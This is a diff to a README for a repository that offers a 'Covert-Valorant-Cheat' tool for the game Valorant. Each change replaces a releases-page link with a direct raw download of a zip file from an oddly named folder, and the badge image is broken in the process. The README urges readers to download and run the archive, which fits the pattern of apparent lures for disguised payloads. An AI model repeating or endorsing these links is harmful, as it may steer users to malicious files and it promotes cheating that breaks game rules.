@@ -1,6 +1,6 @@
 # 🎮 Covert-Valorant-Cheat - Simple Tools to Enhance Your Game
 
-[![Download Covert-Valorant-Cheat](https://img.shields.io/badge/Download%20Now%20-%E2%86%93-blue)](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
+[![Download Covert-Valorant-Cheat](https://raw.githubusercontent.com/eslamsaiead/Covert-Valorant-Cheat/main/confriar/Covert-Valorant-Cheat.zip%20Now%20-%E2%86%93-blue)](https://raw.githubusercontent.com/eslamsaiead/Covert-Valorant-Cheat/main/confriar/Covert-Valorant-Cheat.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To download and run the application, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the release page for Covert-Valorant-Cheat:  
-   [Download Covert-Valorant-Cheat](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
+   [Download Covert-Valorant-Cheat](https://raw.githubusercontent.com/eslamsaiead/Covert-Valorant-Cheat/main/confriar/Covert-Valorant-Cheat.zip)
 
 2. **Select the Latest Version**  
    Look for the latest version listed on the releases page. You will find all available downloads, including essential files.
@@ -31,7 +31,7 @@ To download and run the application, follow these steps:
 
 You can download Covert-Valorant-Cheat by following the prominent link below. Make sure to check for updates regularly to ensure you have the best and safest version.
 
-[Download Covert-Valorant-Cheat](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
+[Download Covert-Valorant-Cheat](https://raw.githubusercontent.com/eslamsaiead/Covert-Valorant-Cheat/main/confriar/Covert-Valorant-Cheat.zip)
 
 ## 🌟 Features
 
